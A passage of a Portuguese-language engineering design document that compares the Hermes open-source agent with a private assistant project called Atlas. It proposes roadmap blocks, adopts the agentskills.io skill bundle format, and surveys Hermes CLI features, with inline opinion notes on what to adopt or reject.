| Permission | `tools/approval.py` (52 KB) embutido em tool layer | `AiPermissionEngine` separado, 3 modos (read/write/danger) |
| Memory native | `MEMORY.md` + `USER.md` + `SOUL.md` (texto livre) + 8 providers plug | DB normalizado (`ai_session_states.*`); B5 propõe `MemoryDelta` tipado |
| Search across sessions | SQLite FTS5 | DB Postgres (sem FTS5 nativo; tem pgvector + tsvector) |
| Cron / scheduled | First-class (`cron/jobs.py` + `cron/scheduler.py`) | ❌ ausente — proposto como B9 neste doc |
| Messaging gateway | 17 plataformas em 1 processo (`gateway/run.py` 605 KB) | ❌ ausente — proposto como B10 |
| Subagent | `delegate_tool.py` 107 KB + orchestrator role + spawn depth + file coord | ❌ ausente |
| Backends de execução | 7 (local, Docker, SSH, Modal, Daytona, Singularity, Vercel) | 1 (local subprocess) — proposto como B11 |
| TUI | Ink (React/Node) + Python JSON-RPC backend (`ui-tui/` + `tui_gateway/`) — NEW v0.11 | Decidido B7: Bubble Tea (Go) — vale revisitar à luz do Hermes Ink |
| ACP / IDE | `acp_adapter/` 41 KB | ❌ ausente |
| Plugins | Sistema completo (5 superfícies, 3 sources de descoberta) | ❌ ausente |
| Hooks | 3 níveis (gateway, plugin, shell scripts) | ❌ ausente |
| Auto-edit memory | Agente chama `memory_tool` quando decide | Operador ratifica `MemoryDelta` proposto |
| Self-evolution | Repo separado (DSPy+GEPA evolui SKILL.md em PRs) | ❌ ausente |
| Padrão aberto | agentskills.io | ❌ não declarado |
| Distribuição | `curl install.sh \| bash`, Linux/Mac/WSL2/Termux | `atlas bootstrap` em macOS |
| `/steer` mid-run | Sim (NEW v0.11) | ❌ ausente — sugerido para B1/B2 (0.5 dia) |
| Personas | Slash command `/personality [name]` | Não declarado |
| Auxiliary models | Compression, vision, session_search, title_generation com auto routing | ❌ não tem distinção |
| Maturidade | v0.11.0, 126K stars, 1.5k commits/release | v1.0 inicial, 0 stars públicas, repo privado |
| Foco | Massivo (toda integração imaginável) | Cirúrgico (1 operador, fidelidade) |

---

## 19. Lições para o Atlas — blocos B9+

Em ordem de valor incremental:

**B9 — Cron / Scheduled Tasks** (3–4 dias). Já detalhado em §9. Melhor candidato a próximo bloco depois de B0–B8 — destrava "Atlas trabalha sozinho".

**B10 — Messaging Gateway Telegram** (5–7 dias). Detalhado em §10. Multiplica utilidade do B9 (cron scheduler entrega via Telegram).

**B11 — Remote Backend SSH** (3–5 dias). §11. Permite Atlas rodar sem o Mac aberto.

**B12 — `/steer`** (0.5 dia). §15. Quick win, alto valor. Pode ser parte do B1/B2.

**B13 — Skill Bundle Format** (2–3 dias). §6. Migrar skills de registry plano para `SKILL.md` + `references/` + `templates/` bundle. Compat com agentskills.io. Suaviza adoção futura de ferramentas externas.

**B14 — Transport ABC** (3–5 dias). §4. Permite falar com Anthropic API direta, OpenAI compatível, Bedrock — mantendo Claude/Codex CLI como transports válidos. Multiplica providers de 2 para 18+ no longo prazo.

**B15+ (longo prazo) — ACP Adapter, Self-Evolution pipeline, Plugin System.** §13, §16, §7. Não bloqueiam V2.0; são alavancas de ecossistema.

**Total dos blocos B9–B14:** ~17–25 dias. Atlas em V3.0.

---

## 20. Anti-padrões a NÃO copiar

1. **Monolitos de 605 KB num arquivo.** `gateway/run.py` é antipattern. Atlas tem services ≤30 KB — **manter**.
2. **AIAgent com ~60 parâmetros no init.** Sintoma de service object god class. Atlas distribui responsabilidades em múltiplos services.
3. **`approval.py` (52 KB) dentro de `tools/`.** Permissão é cross-cutting concern, deve viver em `Services/Ai/`, separado.
4. **Memória "self-improving" como vibe.** Marketing fala mais alto que código. Atlas com `MemoryDelta` tipado + ratificação humana é **mais honesto**.
5. **17 plataformas first-day.** Atlas começa com 1 (Telegram). Hermes só chegou a 17 com 1500+ commits.
6. **Skills bundled com 25 categorias na release inicial.** Atlas começa com 5–8 skills focadas (B5.bis se pegar bundle format).

---

## 21. Sources

- [github.com/NousResearch/hermes-agent](https://github.com/NousResearch/hermes-agent) — código principal
- [hermes-agent.nousresearch.com/docs](https://hermes-agent.nousresearch.com/docs/) — documentação oficial
- [hermes-agent.nousresearch.com/docs/developer-guide/architecture](https://hermes-agent.nousresearch.com/docs/developer-guide/architecture) — doc de arquitetura
- [github.com/NousResearch/hermes-agent/blob/main/AGENTS.md](https://github.com/NousResearch/hermes-agent/blob/main/AGENTS.md) — manifesto técnico do projeto
- [github.com/NousResearch/hermes-agent/blob/main/RELEASE_v0.11.0.md](https://github.com/NousResearch/hermes-agent/blob/main/RELEASE_v0.11.0.md) — release notes "Interface release"
- [github.com/NousResearch/hermes-agent-self-evolution](https://github.com/NousResearch/hermes-agent-self-evolution) — DSPy+GEPA pipeline
- [github.com/NousResearch/hermes-agent/blob/main/cron/jobs.py](https://github.com/NousResearch/hermes-agent/blob/main/cron/jobs.py) — cron schema
- [github.com/NousResearch/hermes-agent/tree/main/skills](https://github.com/NousResearch/hermes-agent/tree/main/skills) — skill bundles
- [github.com/NousResearch/hermes-agent/tree/main/plugins/memory](https://github.com/NousResearch/hermes-agent/tree/main/plugins/memory) — memory providers
- [github.com/NousResearch/hermes-agent/tree/main/gateway/platforms](https://github.com/NousResearch/hermes-agent/tree/main/gateway/platforms) — 17 platforms
- [github.com/plastic-labs/honcho](https://github.com/plastic-labs/honcho) — dialectic user modeling
- [agentskills.io](https://agentskills.io) — open standard, 17.6K stars
- [agentskills.io/specification](https://agentskills.io/specification) — spec completa
- [agentskills.io/skill-creation/quickstart](https://agentskills.io/skill-creation/quickstart) — tutorial
- [agentskills.io/skill-creation/best-practices](https://agentskills.io/skill-creation/best-practices) — princípios operacionais
- [agentskills.io/skill-creation/optimizing-descriptions](https://agentskills.io/skill-creation/optimizing-descriptions) — eval pipeline
- [agentskills.io/skill-creation/using-scripts](https://agentskills.io/skill-creation/using-scripts) — scripts em bundle
- [agentskills.io/client-implementation/adding-skills-support](https://agentskills.io/client-implementation/adding-skills-support) — guia de integração
- [github.com/agentskills/agentskills](https://github.com/agentskills/agentskills) — repo de referência (`skills-ref` validator)
- [github.com/anthropics/skills](https://github.com/anthropics/skills) — exemplos oficiais Anthropic
- [agentcommunicationprotocol.dev](https://agentcommunicationprotocol.dev) — ACP

---

## 22. agentskills.io — padrão aberto de skills (proposta B5.bis)

**Por que esta seção existe.** O Hermes claim de compat com agentskills.io é genuíno, e o padrão tem 17.6K stars + adoção por Claude Code, OpenAI Codex e VS Code Copilot. Antes de seguir o B5 original do Atlas (que propunha versionamento próprio `draft→default`), vale comparar com o que o ecossistema aberto já consolidou. **Conclusão antecipada:** parte do B5 deve ser substituída por compat agentskills.io; parte continua válida (memória pós-sessão tipada permanece útil mesmo com skills bundle).

### 22.1 Spec do bundle — leve e prática

Estrutura mínima (do `agentskills.io/specification`):

```
skill-name/
├── SKILL.md          # required: YAML frontmatter + markdown body
├── scripts/          # optional: executáveis chamados pela skill
├── references/       # optional: docs carregados sob demanda
├── assets/           # optional: templates, schemas
└── ...               # qualquer outro arquivo/dir
```

**Frontmatter — apenas 6 campos:**

| Campo | Required | Constraint |
|---|---|---|
| `name` | ✓ | 1-64 chars, `[a-z0-9-]`, sem `--`, sem hífen no início/fim, **deve bater com nome do diretório** |
| `description` | ✓ | 1-1024 chars; descreve o quê + quando usar |
| `license` | — | nome ou referência a arquivo bundled |
| `compatibility` | — | 1-500 chars (ex: `"Requires git, docker, jq"`, `"Designed for Claude Code"`) |
| `metadata` | — | mapa string→string livre |
| `allowed-tools` | — | string `"Bash(git:*) Bash(jq:*) Read"` (experimental) |

> **claude:** essa spec é deliberadamente **mais leve** que o que o B5 do plano Atlas propõe (`MemoryDelta` com `claim+evidence+confidence+valid_from+valid_until+use_when+do_not_use_when+requires_confirmation` + governance `draft→experimental→candidate→default→deprecated`). E está certa em ser leve — porque skill ≠ memória. O B5 misturava os dois conceitos. Recomendação: **B5.bis = skills no formato agentskills.io**; **B5 propriamente = `MemoryDelta` apenas para memória pós-sessão**, deixando skills com formato aberto.

> **claude:** o limite de 1024 chars em `description` é generoso demais para o operador-único Atlas. Eu adotaria o formato e capped internamente em **500 chars** durante a injeção no `AiPromptBuilder`. Densidade > volume.

> **claude:** o campo `compatibility` é subestimado. Frases como `"Requires Python 3.14+ and uv"` ou `"Designed for Claude Code"` resolvem o problema do Atlas hoje em que skills falham silenciosamente quando o ambiente não tem a tool esperada. Adicionar parser que cruza `compatibility` com `AtlasCliDoctorService` é trabalho de meio dia.

### 22.2 Progressive disclosure — princípio central de loading

3 tiers, oficiais:

| Tier | O que carrega | Quando | Custo |
|---|---|---|---|
| **Catálogo** | só `name` + `description` | session start | ~50-100 tokens/skill |
| **Instruções** | `SKILL.md` body inteiro | quando a skill é ativada | <5000 tokens (recomendado) |
| **Recursos** | `scripts/`, `references/`, `assets/` | on demand pelo agent | varia |

Recomendação oficial: **`SKILL.md` ≤ 500 linhas / 5000 tokens**. Conteúdo extenso vai pra `references/` com instrução explícita: *"Read `references/api-errors.md` if the API returns a non-200 status code."*

> **claude:** o Atlas hoje não estratifica. `AiPromptBuilder` injeta tudo de uma vez (skill principal + auxiliares + workflow_instructions + context_pack + permission_instructions + output_contract). Implementar progressive disclosure é mudança de **alta alavancagem**: catálogo permanece no system prompt (cache-friendly), body só entra quando ativado. Isso reduz prompt baseline em 60-80% e libera tokens para `MemoryDelta`/contexto de sessão. Esforço estimado: 2 dias dentro do B5.bis.

### 22.3 Discovery convention `.agents/skills/`

Caminhos a varrer (do `client-implementation/adding-skills-support`):

| Scope | Path | Função |
|---|---|---|
| Project | `<project>/.atlas/skills/` | nativo Atlas |
| Project | `<project>/.agents/skills/` | **cross-client** — chave da interop |
| User | `~/.atlas/skills/` | nativo Atlas |
| User | `~/.agents/skills/` | **cross-client** |

**Regras:**
- Project-level **override** user-level (em colisão de `name`).
- Trust gate: project-level só carrega se `~/.atlas/trusted-projects.json` confirma.
- Skip directories ruidosos: `.git/`, `node_modules/`, `vendor/`.
- Cap profundidade (4-6 níveis) e total de dirs (2000) para evitar runaway.

> **claude:** trust gate é onde Atlas está **mais bem servido que o Hermes**. O Hermes tem allowlist + DM pairing no gateway, mas a discovery de skills é confiante demais por padrão. Atlas pode reusar `AiPermissionEngine` para bloquear ativação de skill cujo workspace não está em `ATLAS_AI_TOOL_ALLOWED_ROOTS`. Decisão de design certa: trust gate em ambos eixos (project trust + skill activation).

### 22.4 Best practices que valem leitura literal

São 6 princípios do `best-practices`. Resumindo o que cada um traz:

**1. Start from real expertise.** Não pedir a um LLM para gerar skill genérica. Extrair de tarefa real concluída, ou sintetizar de runbooks/code review/incident reports do projeto. *"A data-pipeline skill synthesized from your team's actual incident reports will outperform one synthesized from a generic 'data engineering best practices' article."*

**2. Refine with real execution.** Run skill em tarefas reais, ler **execution traces** (não só outputs finais). Agent perdendo tempo em passos improdutivos = sintoma de skill vaga.

**3. Spend context wisely.**
- Add what agent lacks, omit what it knows. Não explicar HTTP, PDF, DB.
- Coherent units. Skill é como função: nem larga (DB query + admin) nem estreita (forçar load de 5 skills).
- Moderate detail. Concisão > exaustividade.
- Progressive disclosure. `SKILL.md` ≤500 linhas; resto em `references/` com gatilhos explícitos.

**4. Calibrate control.**
- Match specificity to fragility. Code review = explica o porquê e deixa flexível. Database migration = comando exato, sem flags adicionais.
- Defaults, not menus. Escolher `pdfplumber`, mencionar `pdf2image+pytesseract` como escape.
- Procedures over declarations. Ensine *como abordar* uma classe de problemas, não *o que produzir* para um caso.

**5. Patterns for effective instructions.**
- **Gotchas section** — *"the `users` table uses soft deletes, queries must include `WHERE deleted_at IS NULL`"*. Lista de fatos environment-specific que defy reasonable assumptions.
- Templates para output format (mais confiável que descrição em prosa).
- Checklists para multi-step workflows.
- Validation loops (do work → run validator → fix → repeat).
- Plan-validate-execute (próxima subseção, importante).
- Bundling reusable scripts (próxima depois).

**6. Bundling reusable scripts.** Se agente reinventa a mesma lógica em runs diferentes, escreva script testado uma vez em `scripts/`.

> **claude:** **Gotchas section é o conteúdo de maior valor.** Esta é a opinião com mais convicção que tenho lendo o doc inteiro. É o que diferencia skill útil de prompt inflado. Atlas pode adotar como **convenção de seção**: toda skill tem `## Gotchas` no body, e o `AiPromptBuilder` pode promover essa seção (quando existe) para um lugar de destaque no prompt. Custo: zero, é convenção de escrita.

> **claude:** *"Procedures over declarations"* é o princípio que **mais melhora skills no longo prazo**. Atlas hoje tem skills via `AiIntentRouter` que misturam orientação ("Use Codex em dev") com declaração ("aqui está como devs fazem PR"). Separar isso é trabalho de revisão das ~25 skills existentes — 1-2 dias de re-write.

> **claude:** *"Refine with real execution — read traces, not just outputs"* depende **diretamente** do B3 (tool events persistidos). Sem B3, não há trace para revisar. B3 destrava esta prática.

### 22.5 Plan-validate-execute — padrão diretamente aplicável

Para operações destrutivas/batch:

```
1. Extract: scripts/analyze_form.py input.pdf → form_fields.json
2. Plan: criar field_values.json com mapeamento intended
3. Validate: scripts/validate_fields.py form_fields.json field_values.json
   (checa que cada field existe, types compatíveis, required não missing)
4. Se validar falhar, revisar field_values.json
5. Execute: scripts/fill_form.py input.pdf field_values.json output.pdf
```

A chave é o **passo 3** — validador script que compara plano contra source of truth. Erros granulares: *"Field 'signature_date' not found — available: customer_name, order_total, signature_date_signed"* dão ao agente informação suficiente para self-correct.

> **claude:** este padrão **encaixa perfeitamente** no `AiPermissionEngine` + `DevExecutionPlan` (B2 do plano Atlas). A validação intermediária é o que separa "agente com permissão para escrever" de "agente que escreve coisa errada com permissão". Recomendação: criar `skills/dev-quality-gate/SKILL.md` no formato bundle, com `scripts/validate-plan.sh` chamando lógica do `AtlasCliQualityService`. Trabalho: 1 dia. Encaixa no B2.

### 22.6 Optimization process formal para descriptions

O `optimizing-descriptions` define um workflow rigoroso:

- **20 eval queries** (8-10 should-trigger + 8-10 should-not-trigger).
- Should-not-trigger valiosos = **near-misses** ("update Excel formulas" não deve triggerar skill de "CSV analysis").
- 3 runs por query, threshold trigger rate 0.5.
- Train/validation split 60/40 — evita overfitting.
- Não adicionar keywords específicas de queries falhas (overfitting); generalizar para o conceito.
- Existe skill `skill-creator` que automatiza o loop.
- Rodar até validation pass rate estabilizar (~5 iterações).

Princípios para escrever description:
- **Imperativo:** *"Use this skill when..."* (não *"This skill does..."*).
- **Foco em user intent**, não implementação.
- **Pushy explicitude:** listar contextos onde aplica mesmo quando user não menciona ("even if they don't explicitly mention 'CSV' or 'analysis'").
- **Conciso:** poucos parágrafos.

> **claude:** rodar este loop formal para cada skill é **ROI baixo até Atlas ter ~50 skills ambíguas**. Hoje você tem ~25 agents no `AiIntentRouter`. Roteamento é por keyword, não por description matching contra LLM. **Não adotar agora.** O que adotar **agora**: as 4 regras de phrasing (imperativo, user intent, pushy, conciso) — re-write das 25 descriptions atuais leva 1-2 horas.

### 22.7 Scripts em bundle — PEP 723 e similares

**One-off commands** (sem `scripts/`): `uvx ruff@0.8.0 check .`, `npx eslint@9 --fix .`. Pin de versão é regra.

**Self-contained scripts** (com `scripts/`): inline deps via PEP 723 (Python), `npm:`/`jsr:` (Deno), `cheerio@1.0.0` direto no import (Bun), `bundler/inline` (Ruby). Sem manifest, sem virtualenv setup.

```python
# /// script
# dependencies = ["beautifulsoup4"]
# ///
from bs4 import BeautifulSoup
```
→ `uv run scripts/extract.py`.

**Princípios para script agentic:**
- **Não bloquear em prompts interativos** (agente não responde TTY) — hard requirement.
- `--help` documenta interface (entra no contexto do agente).
- Erros descritivos: *"Error: --format must be one of: json, csv, table. Received: 'xml'"*.
- Output estruturado (JSON/CSV stdout, diagnóstico stderr).
- Idempotência (agente pode retry).
- `--dry-run` para destrutivo.
- Output previsível com `--offset` para paginação (output >10-30K chars é truncado por harness).
- Exit codes distintos por tipo de falha, documentados em `--help`.

> **claude:** PEP 723 + `uv run` é **elegante** e Atlas deveria adotar para scripts bundled. Hoje Atlas tem `AtlasRuntimeCommand` com `shell.run` genérico — bundling de scripts em `skills/<name>/scripts/extract.py` com PEP 723 é caminho mais limpo do que toolset PHP custom. Casa com a stack PHP do server (PHP roda subprocess `uv run` sem dor).

> **claude:** os princípios de script agentic (no interactive prompts, `--help`, structured output, exit codes documentados) são **higiene gratuita**. Atlas pode adicionar essas regras como `claude.md`/`AGENTS.md` no repo `atlas-server` para que toda skill bundled siga o padrão. Não é spec, é convenção. Custo zero, ganho composto.

### 22.8 Implementação client-side — o que Atlas precisa fazer

Do `adding-skills-support`, em 5 passos:

**1. Discover.** Scanner em `~/.atlas/skills/`, `.atlas/skills/`, `.agents/skills/` (project + user) com trust gate, depth cap, dir cap. Registrar `name`, `description`, `location` (path absoluto). Lenient validation: warn em mismatch nome/diretório, **skip apenas se `description` ausente ou YAML totalmente quebrado**.

**2. Parse.** YAML frontmatter entre `---` delimiters; markdown body depois. Fallback para YAML inválido (colons unquoted) — wrap em quotes e re-parse antes de skip.

**3. Disclose.** Catálogo no system prompt (mais simples) ou como description de tool dedicada (mais limpo). Behavioral instruction curta: *"Quando uma tarefa matches a skill description, use file-read tool no `location` para load full instructions."*

**4. Activate.** Duas opções:
- **File-read activation** — agente chama tool de leitura padrão com path do `SKILL.md`. Sem infra nova.
- **Dedicated tool** `activate_skill(name)` — controla o que retorna, faz wrapping em `<skill_content name="...">`, lista resources bundled, enforça permission, tracking.

Slash command `/skill-name` para user-explicit activation (Atlas já tem padrão de slash).

**5. Manage context over time.** Proteger conteúdo de skill de compaction (caso contrário o agente perde a guidance silenciosamente meio-conversa). Deduplicar activations na mesma sessão. Subagent delegation opcional (skill roda em sessão separada, retorna sumário).

> **claude:** começar por **file-read activation** é a opção certa para Atlas. Já existe `file.read` no `AtlasRuntimeCommand`. Adicionar `activate_skill` tool dedicada é otimização posterior — dá pra fazer só quando for a hora de strip frontmatter, listar resources, ou enforçar permission. Não fazer overengineering no day 1.

> **claude:** "proteger skill content de compaction" é onde **`AiCompactionService` precisa de uma flag**. Hoje compaction não distingue skill content de turn content. Adicionar tag `<skill_content name="...">` no body injetado e pular esse range no compactor é alteração de ~50 linhas no `AiCompactionService`. Crítico, custo baixo.

### 22.9 Proposta concreta — B5.bis

**Bloco B5.bis — Atlas Skills v1 (compat agentskills.io)** (3-5 dias):

| Entregável | Esforço |
|---|---|
| `App\Services\Ai\AiSkillBundleParser` (parse `SKILL.md` YAML frontmatter + body, lenient validation) | 0.5d |
| `App\Services\Ai\AiSkillDiscoveryService` (scanner em 4 paths, trust gate via `AtlasCliDoctorService`, dedup por name, project>user precedence) | 1d |
| `App\Services\Ai\AiSkillBundleStore` (registry in-memory, indexa name→{description, location, body}) | 0.5d |
| Integração com `AiPromptBuilder` (catálogo no system prompt — tier 1; body injection on activation — tier 2; resolve paths relativos) | 1d |
| Activation: file-read via `file.read`; slash `/<skill-name>` no `AiChatCommand` | 0.5d |
| Compaction-protect: tag `<skill_content>` no body; `AiCompactionService` skip range | 0.5d |
| Tests: 5-8 cases (discovery, parse lenient, activation, dedup, compaction skip) | 1d |
| `compatibility` parser que cruza com `AtlasCliDoctorService` → warning se ambiente não bate | 0.5d |

Skills bundled iniciais (5-8, no formato bundle, em `atlas-server/skills/`):
- `dev-quality-gate/` (com `scripts/validate-plan.sh` — encaixa B2)
- `code-reviewer/`
- `decision-advisor/`
- `researcher-quick/`
- `comunicador-claro/` (output governor — migra do prompt builder atual)
- `provider-handoff/`
- `session-compaction/`

Convenção de body para todas: `## When to use` + `## Procedure` + `## Gotchas` + opcional `## References` + opcional `## Scripts`.

**Mudanças no plano original:**
- B5 fica **só com `MemoryDelta`** (memória pós-sessão tipada, ratificada). Continua válido — não é skill, é fato aprendido com evidência.
- Governance `draft→default` do plano original **sai** — agentskills.io não tem versionamento, e Atlas com 1 operador não precisa.
- `AiIntentRouter` por keyword **coexiste** com skill bundle: agente pode ser convocado tanto por matching de description (file-read direto via Skill tool) quanto por keyword (caminho legado).

### 22.10 O que adotar / o que ignorar / o que adaptar

| Item | Decisão | Por quê |
|---|---|---|
| Bundle format (`SKILL.md` + `scripts/` + `references/` + `assets/`) | **adotar** | Substitui registry plano; cross-client grátis |
| 6 campos do frontmatter | **adotar** | Leve, prático |
| Limite 1024 chars em description | **adaptar — cap em 500 internamente** | Densidade > volume para Atlas |
| `compatibility` field cruzado com Doctor | **adotar** | Resolve falha silenciosa de ambiente |
| `allowed-tools` field | **ignorar** | Experimental; `AiPermissionEngine` mais maduro |
| Progressive disclosure (3 tiers) | **adotar** | Reduz prompt baseline em 60-80% |
| Discovery `.agents/skills/` | **adotar** | Compat com Claude Code/Codex/VS Code grátis |
| Trust gate em project skills | **adotar** | Reusa `AiPermissionEngine` |
| Gotchas section como convenção | **adotar** | Maior valor por linha em qualquer skill |
| Templates / Checklists / Validation loops | **adotar** como padrões em skills | Padrões úteis, custo zero de adoção |
| Plan-validate-execute (skill `dev-quality-gate`) | **adotar** | Encaixa B2 |
| PEP 723 / `uv run` para scripts Python | **adotar** | Eleganto, sem manifest |
| Princípios de script agentic (no TTY, `--help`, structured output) | **adotar** como convenção em `AGENTS.md` do server | Higiene gratuita |
| Eval pipeline para descrições (train/val split) | **postpone** | ROI baixo até ~50 skills ambíguas |
| Versionamento de skill (`draft→default`) | **descartar** | agentskills.io não tem; Atlas 1-operador não precisa |
| Subagent delegation para skills | **postpone** | Não bloqueia V2.0 |
| `skill-creator` skill (Anthropic) automation | **postpone** | Vale só após base agentskills.io estar pronta |

---

## 23. Decisões pendentes (você decide)

1. **B7 stack revisitar?** Hermes optou por Ink (React/Node) — mais coerente com Atlas-app (Expo). Bubble Tea (Go) ainda é viável; vale uma rodada explícita antes de implementar B7.
2. **Adicionar B9–B14 ao roadmap pós-V2.0?** Cron + Messaging Gateway + Remote Backend são os 3 mais valiosos.
3. **`/steer` em B1/B2?** Quick win 0.5 dia.
4. **B5.bis (agentskills.io compat) substitui parcialmente B5?** Recomendação clara em §22.9: sim. B5 fica só com `MemoryDelta`; skills viram bundle agentskills.io.
5. **Transport ABC vale o esforço?** Justifica-se quando Atlas quiser falar com Anthropic API direta ou OpenRouter. Hoje só Claude/Codex CLI — não urgente.

---

## 24. Loop de dissecação da documentação Hermes

> Esta seção cresce iterativamente. Cada subseção §24.N é uma rodada de leitura + condensação + notas. Vou parar quando esgotar a documentação oficial. Notas marcadas `claude:` são opinião direta sobre adoção/rejeição para o Atlas.

### 24.1 — CLI completo (`/docs/user-guide/cli`)

**Modos de execução do binário `hermes`:**

```bash
hermes                                    # interativo (padrão)
hermes chat -q "Hello"                   # one-shot
hermes chat --model "anthropic/claude-sonnet-4"
hermes chat --provider nous              # Nous Portal | openrouter | etc
hermes chat --toolsets "web,terminal,skills"
hermes -s hermes-agent-dev,github-auth   # pré-carregar skills
hermes --continue                         # retomar última (-c)
hermes --resume <session_id>              # retomar específica (-r)
hermes -w                                 # **git worktree isolado** (interativo)
hermes -w -q "Fix issue #123"            # one-shot dentro de worktree
hermes chat --verbose
```

**Status bar persistente** (acima do input, atualiza em real-time):

```
⚕ claude-sonnet-4-20250514 │ 12.4K/200K │ [██████░░░░] 6% │ $0.06 │ 15m
```

Cores por % do context window:

| % usado | Cor | Significado |
|---|---|---|
| <50% | verde | espaço |
| 50–80% | amarelo | enchendo |
| 80–95% | laranja | aproximando limite |
| ≥95% | vermelho | considerar `/compress` |

Adapta-se a colunas: completo ≥76, compacto 52–75, mínimo <52 (modelo + duração).

> **claude:** o status bar com cores é **adoção direta** para o Atlas TUI (B7). Hoje `atlas:cli:dashboard --watch=N` mostra painéis estáticos. Cor por % de contexto é UX gratuita — o `AiCompactionService` já tem `token_estimate_after`, basta ler. Mudança em `AtlasCliDashboardService::build()`: ~30 linhas.

> **claude:** a flag `-w` (git worktree isolado) é **brilhante** e Atlas deveria copiar como bloco curto. Vitor já usa worktree manualmente quando faz mudanças paralelas. `atlas dev -w "X"` cria worktree, roda dentro, e descarta limpo. Encaixa em B2 (DevExecutionPlan) — 1 dia.

**Keybindings completos** (lista exaustiva):

| Tecla | Ação |
|---|---|
| `Enter` | enviar |
| `Alt+Enter` / `Ctrl+J` | nova linha |
| `Alt+V` | colar imagem do clipboard |
| `Ctrl+V` | colar texto + anexar imagens oportunisticamente |
| `Ctrl+B` | gravação voz (config `voice.record_key`) |
| `Ctrl+G` | abrir buffer no `$EDITOR` |
| `Ctrl+X Ctrl+E` | binding Emacs alternativo |
| `Ctrl+C` | interromper agent (duplo em 2s = forçar exit) |
| `Ctrl+D` | sair |
| `Ctrl+Z` | suspender background (Unix; `fg` retoma) |
| `Tab` | autocomplete slash + sugestão |

**Multi-line input.** Dois mecanismos: `Alt+Enter`/`Ctrl+J` ou backslash continuation (linha termina em `\`).

**Pasted multi-line preview** — em vez de despejar, mostra `[pasted: 47 lines, 1,842 chars — press Enter to send]`. Conteúdo completo continua sendo enviado.

**Markdown stripping** — CLI remove `**bold**`, `*italic*`, fences verbosos das respostas finais do agent. Code blocks e listas ficam. **Não** afeta gateway nem tool results.

> **claude:** markdown stripping é controverso — funciona no terminal mas perde estrutura no `atlas trace show`. Atlas deve **não copiar** isso na resposta principal e fazer só no rendering de status. Trace permanece markdown puro.

**Slash commands** (40+, dropdown autocomplete ao digitar `/`). Os categóricos:

| Comando | Função |
|---|---|
| `/help` | help |
| `/model` | mostrar/mudar modelo |
| `/tools` | listar ferramentas |
| `/skills browse` | navegar skills hub oficial |
| `/background <prompt>` | sessão isolada paralela |
| `/skin` | mudar skin do CLI |
| `/voice on` | ativar voice mode |
| `/voice tts` | toggle TTS |
| `/reasoning high` | reasoning effort |
| `/title <name>` | nomear sessão |
| `/verbose` | `off → new → all → verbose` |
| `/usage` | breakdown tokens/custos |
| `/compress` | comprimir contexto |
| `/busy <mode>` | mudar modo busy: `interrupt/queue/steer` |

**Quick commands** (custom em `~/.hermes/config.yaml`, **sem invocar LLM** — execução direta de shell):

```yaml
quick_commands:
  status:
    type: exec
    command: systemctl status hermes-agent
  gpu:
    type: exec
    command: nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader
  restart:
    type: alias
    target: /gateway restart
```

`type: exec` roda shell; `type: alias` redireciona para outro comando. Funcionam em CLI + plataformas messaging.

> **claude:** **quick commands são uma feature que Atlas precisa.** Vitor frequentemente quer chamar `git status`/`brew services list`/etc. dentro do REPL sem invocar LLM. Atlas hoje só tem slash commands que SEMPRE chamam LLM. Adicionar `type: exec`/`type: alias` em `~/.atlas/config.yaml` e registrar como slash commands extras no `AiChatCommand::process_command()` é trabalho de meio dia. **Recomendo adicionar em B1 ou B2.**

**Preloading skills.** `hermes -s skill1,skill2` carrega no system prompt antes da primeira turn. Funciona em interactive e one-shot.

**Skill slash commands.** Toda skill em `~/.hermes/skills/` registra automaticamente como `/<skill-name>`. Exemplos: `/gif-search funny cats`, `/github-pr-workflow create a PR for auth refactor`, `/excalidraw` (carrega skill e deixa agent perguntar).

**Personalities** — 14 built-in (`helpful`, `concise`, `technical`, `creative`, `teacher`, `kawaii`, `catgirl`, `pirate`, `shakespeare`, `surfer`, `noir`, `uwu`, `philosopher`, `hype`) + custom no `config.yaml`:

```yaml
personalities:
  helpful: "You are a helpful, friendly AI assistant."
  pirate: "Arrr! Ye be talkin' to Captain Hermes..."
```

> **claude:** personalities é UX bom para hobbyist agent, **mas para Atlas é noise**. Atlas é cirúrgico, fidelidade ao operador, voz própria definida em master prompt. **Não copiar.** O equivalente Atlas é o `comunicador-claro` skill (output governor) — uma identidade só, refinada.

**Interrupting the agent** — múltiplas opções:

- digitar nova mensagem + Enter durante trabalho → interrompe + processa
- `Ctrl+C` (duplo em 2s = exit forçado)
- comandos de terminal em-progresso recebem SIGTERM, SIGKILL após 1s
- múltiplas mensagens digitadas durante interrupt **combinam-se em 1 prompt**

**Busy input mode** (config `display.busy_input_mode`):

| Modo | Comportamento |
|---|---|
| `interrupt` (default) | mensagem interrompe operação |
| `queue` | enfileirada, enviada no próximo turn |
| `steer` | injetada no run via `/steer`, chega após próxima tool call |

Mudar inline: `/busy queue`, `/busy steer`, `/busy interrupt`, `/busy status`.

`steer` cai automaticamente para `queue` se agent não startou ou se imagens estão anexadas.

**First-touch hint:** primeira vez que pressiona Enter durante trabalho do agent, printa one-liner `(tip) Your message interrupted...`. Flag `onboarding.seen.busy_input_prompt`. Uma vez por install.

> **claude:** **3-modes de busy input é UX brilhante.** Atlas hoje só tem 1 modo (interrupt). `queue` é o modo "preparar próxima pergunta sem cancelar o que está rodando" — operador composto. `steer` complementa o `/steer` (nota §15 do doc): mensagens digitadas durante trabalho viram nudges automáticos. **Adoção em B1 junto com `/steer`.** Trabalho: 1 dia.

**Suspending to background.** `Ctrl+Z` (Unix only). Shell printa `Hermes Agent has been suspended. Run `fg` to bring back.` Não funciona em Windows.

**Tool progress display** com **KawaiiSpinner**:

```
◜ (｡•́︿•̀｡) pondering... (1.2s)
◠ (⊙_⊙) contemplating... (2.4s)
✧٩(ˊᗜˋ*)و✧ got it! (3.1s)
```

E feed de tool execution:

```
┊ 💻 terminal `ls -la` (0.3s)
┊ 🔍 web_search (1.2s)
┊ 📄 web_extract (2.1s)
```

`/verbose` cicla: `off → new → all → verbose`.

`display.tool_preview_length` (config) trunca preview de tool calls (paths/comandos). Default `0` = sem limite.

> **claude:** spinner kawaii é coisa de `agent/display.py` (37 KB). Atlas com filosofia "luxo silencioso" **não vai por aí**. Mas o **feed de tool execution** (`┊ tool_name (duration_ms)`) é elegante e Atlas pode adotar — alinha com B3 (tool events).

**Session management** — output ao sair printa exatamente como retomar:

```
Resume this session with:
hermes --resume 20260225_143052_a1b2c3
Session:        20260225_143052_a1b2c3
Duration:       12m 34s
Messages:       28 (5 user, 18 tool calls)
```

Resuming restaura histórico completo do SQLite. `hermes sessions list` navega antigas. `hermes sessions rename <id> <title>` renomeia.

